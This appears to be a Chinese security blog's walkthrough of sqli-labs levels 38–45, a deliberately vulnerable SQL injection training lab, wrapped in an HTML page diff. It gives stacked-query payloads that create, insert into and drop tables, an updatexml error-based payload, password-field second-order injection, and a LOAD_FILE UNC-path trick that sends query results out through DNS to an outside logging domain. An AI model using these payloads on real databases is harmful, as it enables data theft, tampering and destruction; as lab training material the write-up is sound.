@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sqli-labs38~45 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="读文件——DNSLOG外带使用网站http:&#x2F;&#x2F;dnslog.cn&#x2F; UNC路径(只存在windows系统)格式：\servername\sharename,其中severname是服务器名，sharename是共享资源的名称。?id&#x3D;1&#39;;select 1,2,LOAD_FILE(group_concat(&#39;\\\\&#39;),mysql查询语句,&#39;域名\\abc&amp;#3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs38~45">
+<meta property="og:url" content="http://example.com/2020/12/12/sqli-labs/38/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="读文件——DNSLOG外带使用网站http:&#x2F;&#x2F;dnslog.cn&#x2F; UNC路径(只存在windows系统)格式：\servername\sharename,其中severname是服务器名，sharename是共享资源的名称。?id&#x3D;1&#39;;select 1,2,LOAD_FILE(group_concat(&#39;\\\\&#39;),mysql查询语句,&#39;域名\\abc&amp;#3">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/12/12/sqli-labs/38/38.md/1.png">
+<meta property="og:image" content="http://example.com/2020/12/12/sqli-labs/38/38.md/0.png">
+<meta property="og:image" content="http://example.com/2020/12/12/sqli-labs/38/38.md/2.png">
+<meta property="article:published_time" content="2020-12-12T04:35:34.000Z">
+<meta property="article:modified_time" content="2021-05-23T01:35:22.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/12/12/sqli-labs/38/38.md/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sqli-labs/38" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/12/12/sqli-labs/38/" class="article-date">
+  <time class="dt-published" datetime="2020-12-12T04:35:34.000Z" itemprop="datePublished">2020-12-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sqli-labs38~45
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="读文件——DNSLOG外带"><a href="#读文件——DNSLOG外带" class="headerlink" title="读文件——DNSLOG外带"></a>读文件——DNSLOG外带</h3><p>使用网站<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<h4 id="UNC路径-只存在windows系统"><a href="#UNC路径-只存在windows系统" class="headerlink" title="UNC路径(只存在windows系统)"></a>UNC路径(只存在windows系统)</h4><p>格式：\servername\sharename,其中severname是服务器名，sharename是共享资源的名称。<br><code>?id=1&#39;;select 1,2,LOAD_FILE(group_concat(&#39;\\\\&#39;),mysql查询语句,&#39;域名\\abc&#39;)</code><br>第一个相当于转义两个\,可以把想要的信息放在子域名。</p>
+<h3 id="堆叠注入。"><a href="#堆叠注入。" class="headerlink" title="堆叠注入。"></a>堆叠注入。</h3><p><strong>mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</strong></p>
+<p>复习一下，调用数据库时，可以不加；</p>
+<h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><p>通过与注入点加;分隔开加新的注入。<br>打开后台数据库检验。<br>创表<br><code>?id=1&#39;;create table test like users--+</code><br><img src="38.md/1.png"><br><img src="38.md/0.png"></p>
+<p>还可以直接用MySQL语句创表：<br><code>?id=1&#39;;insert into users(id,username,password)values(16,&#39;fafu&#39;,&#39;fafu&#39;)--+</code>记得字符要加单引号或者双引号。<br><img src="38.md/2.png"><br><code>?id=1&#39;;create table test like aaa;</code>后面加分号也可以的。<br><code>?id=1&#39;;drop table test--+</code><br><strong>补充：这里创表需要加like users 是因为创表需要知道字段名还有字段类型。</strong></p>
+<h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><p>为数字型，也是堆叠注入。</p>
+<h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><p>改成’)即可</p>
+<h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><p>也是数字型注入,错误不回显，盲注。</p>
+<h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p>这里和24关有点相似，我们尝试创建新用户，失败了，被发现了。<br>看了一下源码，猜测注入点在password，开始尝试。创建新用户失败，用原来的账户密码登陆。<br>跳到改密码页面，把密码改成’#后缀的，再次用次密码登陆，登陆失败，嘿嘿嘿，注入点来了。<br>直接构造报错函数：<br><code>&#39; and updatexml(1,concat(0x7c,database()),1)#</code>，ok成功。<br><strong>堆叠注入</strong><br>在password构造，<br><code>1&#39;;create table test1 like users#</code>可以注入。<br>因为输入密码时是看不见的，这里建议，先写打在记事本上，在复制粘贴。</p>
+<h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><p>改成’)即可。</p>
+<h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><p>这一关没有报错信息，盲注</p>
+<h3 id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><p>也没有报错信息，可以盲注<br>看了大佬博客，以上关卡，也是堆叠注入类型的，通过在password上构造payload，这里不再赘述。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/12/sqli-labs/38/" data-id="ckr3hbgt5002l4cvo8fyr312t" data-title="sqli-labs38~45" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/12/14/sqli-labs/46/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sqli-labs46~53
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/12/12/sqli-labs/32/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sqli-labs32~35</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWAsql%E6%B3%A8%E5%85%A5%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">DVWAsql注入和文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">PHP伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cs%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" rel="tag">cs简单利用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/" rel="tag">kali网络配置问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" rel="tag">msf简单使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag">一句话木马</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/DVWAsql%E6%B3%A8%E5%85%A5%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">DVWAsql注入和文件上传</a> <a href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">PHP伪协议</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 20px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/cs%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" style="font-size: 10px;">cs简单利用</a> <a href="/tags/kali%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/" style="font-size: 10px;">kali网络配置问题</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/msf%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">msf简单使用</a> <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">一句话木马</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 10px;">攻防世界</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 15px;">文件上传</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 12.5px;">暴力破解</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/08/buu4/">buu4</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/02/CTF-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/">CTF-SQL注入进阶</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/01/CTF-%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/">CTF-脚本基础</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/30/CTF-PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8/">CTF-PHP序列化安全</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/29/CTF-XXE%E6%B3%A8%E5%85%A5/">CTF-XXE注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
